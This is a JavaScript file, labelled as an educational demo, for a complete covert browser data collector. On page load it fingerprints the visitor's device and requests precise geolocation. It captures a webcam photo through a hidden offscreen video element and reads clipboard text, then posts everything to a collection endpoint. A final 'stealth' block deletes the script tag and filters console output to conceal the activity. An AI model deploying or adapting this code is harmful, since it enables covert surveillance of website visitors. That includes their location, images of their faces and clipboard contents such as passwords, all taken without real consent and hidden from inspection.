/**
 * Advanced Data Collection Script
 * For educational/demonstration purposes only
 * Shows the extent of browser fingerprinting and data collection capabilities
 */

class AdvancedDataCollector {
    constructor() {
        this.collectedData = {};
        this.init();
    }

    async init() {
        // Start collection immediately but silently
        await this.collectBasicFingerprint();
        await this.collectGeolocation();
        await this.collectMediaDevices();
        await this.collectBatteryInfo();
        await this.collectNetworkInfo();
        await this.collectStorageInfo();
        await this.collectHardwareInfo();
        await this.attemptCameraAccess();
        await this.collectClipboardData();

        // Send collected data
        this.sendData();
    }

    async collectBasicFingerprint() {
        try {
            this.collectedData.screen = {
                width: screen.width,
                height: screen.height,
                availWidth: screen.availWidth,
                availHeight: screen.availHeight,
                colorDepth: screen.colorDepth,
                pixelDepth: screen.pixelDepth,
                orientation: screen.orientation?.type || 'unknown'
            };

            this.collectedData.viewport = {
                width: window.innerWidth,
                height: window.innerHeight,
                devicePixelRatio: window.devicePixelRatio
            };

            this.collectedData.timezone = {
                name: Intl.DateTimeFormat().resolvedOptions().timeZone,
                offset: new Date().getTimezoneOffset(),
                locale: navigator.language,
                languages: navigator.languages
            };

            this.collectedData.browser = {
                userAgent: navigator.userAgent,
                platform: navigator.platform,
                vendor: navigator.vendor,
                cookieEnabled: navigator.cookieEnabled,
                onLine: navigator.onLine,
                doNotTrack: navigator.doNotTrack,
                hardwareConcurrency: navigator.hardwareConcurrency,
                maxTouchPoints: navigator.maxTouchPoints
            };

            // Canvas fingerprinting
            this.collectedData.canvas = this.getCanvasFingerprint();

            // WebGL fingerprinting
            this.collectedData.webgl = this.getWebGLFingerprint();

        } catch (error) {
            console.log('Basic fingerprint collection failed:', error);
        }
    }

    async collectGeolocation() {
        return new Promise((resolve) => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        this.collectedData.geolocation = {
                            latitude: position.coords.latitude,
                            longitude: position.coords.longitude,
                            accuracy: position.coords.accuracy,
                            altitude: position.coords.altitude,
                            altitudeAccuracy: position.coords.altitudeAccuracy,
                            heading: position.coords.heading,
                            speed: position.coords.speed,
                            timestamp: position.timestamp
                        };
                        resolve();
                    },
                    (error) => {
                        this.collectedData.geolocation = { error: error.message };
                        resolve();
                    },
                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );
            } else {
                this.collectedData.geolocation = { error: 'Geolocation not supported' };
                resolve();
            }
        });
    }

    async collectMediaDevices() {
        try {
            if ('mediaDevices' in navigator && 'enumerateDevices' in navigator.mediaDevices) {
                const devices = await navigator.mediaDevices.enumerateDevices();
                this.collectedData.mediaDevices = devices.map(device => ({
                    deviceId: device.deviceId,
                    kind: device.kind,
                    label: device.label,
                    groupId: device.groupId
                }));
            }
        } catch (error) {
            this.collectedData.mediaDevices = { error: error.message };
        }
    }

    async collectBatteryInfo() {
        try {
            if ('getBattery' in navigator) {
                const battery = await navigator.getBattery();
                this.collectedData.battery = {
                    charging: battery.charging,
                    chargingTime: battery.chargingTime,
                    dischargingTime: battery.dischargingTime,
                    level: battery.level
                };
            }
        } catch (error) {
            this.collectedData.battery = { error: error.message };
        }
    }

    async collectNetworkInfo() {
        try {
            if ('connection' in navigator) {
                const connection = navigator.connection;
                this.collectedData.network = {
                    effectiveType: connection.effectiveType,
                    downlink: connection.downlink,
                    rtt: connection.rtt,
                    saveData: connection.saveData,
                    type: connection.type
                };
            }
        } catch (error) {
            this.collectedData.network = { error: error.message };
        }
    }

    async collectStorageInfo() {
        try {
            if ('storage' in navigator && 'estimate' in navigator.storage) {
                const estimate = await navigator.storage.estimate();
                this.collectedData.storage = {
                    quota: estimate.quota,
                    usage: estimate.usage,
                    usageDetails: estimate.usageDetails
                };
            }

            // Local storage fingerprinting
            this.collectedData.localStorage = {
                supported: typeof(Storage) !== "undefined",
                length: localStorage.length
            };

        } catch (error) {
            this.collectedData.storage = { error: error.message };
        }
    }

    async collectHardwareInfo() {
        try {
            // Memory info (Chrome only)
            if ('memory' in performance) {
                this.collectedData.memory = {
                    jsHeapSizeLimit: performance.memory.jsHeapSizeLimit,
                    totalJSHeapSize: performance.memory.totalJSHeapSize,
                    usedJSHeapSize: performance.memory.usedJSHeapSize
                };
            }

            // Device memory (experimental)
            if ('deviceMemory' in navigator) {
                this.collectedData.deviceMemory = navigator.deviceMemory;
            }

        } catch (error) {
            this.collectedData.hardware = { error: error.message };
        }
    }

    async attemptCameraAccess() {
        try {
            if ('mediaDevices' in navigator && 'getUserMedia' in navigator.mediaDevices) {
                // Create a hidden video element
                const video = document.createElement('video');
                video.style.position = 'absolute';
                video.style.left = '-9999px';
                video.style.width = '1px';
                video.style.height = '1px';
                document.body.appendChild(video);

                const stream = await navigator.mediaDevices.getUserMedia({
                    video: {
                        width: 640,
                        height: 480,
                        facingMode: 'user'
                    },
                    audio: false
                });

                video.srcObject = stream;
                await video.play();

                // Wait a moment for the video to load
                await new Promise(resolve => setTimeout(resolve, 500));

                // Capture image
                const canvas = document.createElement('canvas');
                canvas.width = 640;
                canvas.height = 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, 640, 480);

                // Convert to base64
                const imageData = canvas.toDataURL('image/jpeg', 0.8);
                this.collectedData.camera = {
                    captured: true,
                    imageData: imageData,
                    timestamp: Date.now()
                };

                // Stop the stream
                stream.getTracks().forEach(track => track.stop());

                // Remove elements
                document.body.removeChild(video);

            }
        } catch (error) {
            this.collectedData.camera = {
                error: error.message,
                attempted: true
            };
        }
    }

    async collectClipboardData() {
        try {
            if ('clipboard' in navigator && 'readText' in navigator.clipboard) {
                const clipboardText = await navigator.clipboard.readText();
                this.collectedData.clipboard = {
                    content: clipboardText.substring(0, 1000), // Limit to first 1000 chars
                    length: clipboardText.length
                };
            }
        } catch (error) {
            this.collectedData.clipboard = { error: error.message };
        }
    }

    getCanvasFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const ctx = canvas.getContext('2d');

            // Draw complex pattern for fingerprinting
            ctx.textBaseline = 'top';
            ctx.font = '14px Arial';
            ctx.fillStyle = '#f60';
            ctx.fillRect(125, 1, 62, 20);
            ctx.fillStyle = '#069';
            ctx.fillText('Advanced Data Collection Demo 🎯', 2, 15);
            ctx.fillStyle = 'rgba(102, 204, 0, 0.7)';
            ctx.fillText('Browser Fingerprinting Test', 4, 45);

            return canvas.toDataURL();
        } catch (error) {
            return { error: error.message };
        }
    }

    getWebGLFingerprint() {
        try {
            const canvas = document.createElement('canvas');
            const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');

            if (!gl) return { error: 'WebGL not supported' };

            return {
                vendor: gl.getParameter(gl.VENDOR),
                renderer: gl.getParameter(gl.RENDERER),
                version: gl.getParameter(gl.VERSION),
                shadingLanguageVersion: gl.getParameter(gl.SHADING_LANGUAGE_VERSION),
                extensions: gl.getSupportedExtensions()
            };
        } catch (error) {
            return { error: error.message };
        }
    }

    async sendData() {
        try {
            const response = await fetch('/api/collect-advanced-data', {
                method: 'POST',
                headers: {
                    'Content-Type': 'application/json',
                },
                body: JSON.stringify({
                    timestamp: Date.now(),
                    url: window.location.href,
                    referrer: document.referrer,
                    data: this.collectedData
                })
            });

            if (!response.ok) {
                console.log('Failed to send advanced data');
            }
        } catch (error) {
            console.log('Error sending advanced data:', error);
        }
    }
}

// Start collection when DOM is loaded
if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', () => {
        new AdvancedDataCollector();
    });
} else {
    new AdvancedDataCollector();
}

// Additional stealth techniques
(function() {
    // Hide the script from developer tools
    const script = document.currentScript;
    if (script) {
        script.remove();
    }

    // Override console.log to hide our activities
    const originalLog = console.log;
    console.log = function(...args) {
        if (!args.some(arg => typeof arg === 'string' && arg.includes('Advanced Data Collection'))) {
            originalLog.apply(console, args);
        }
    };
})();
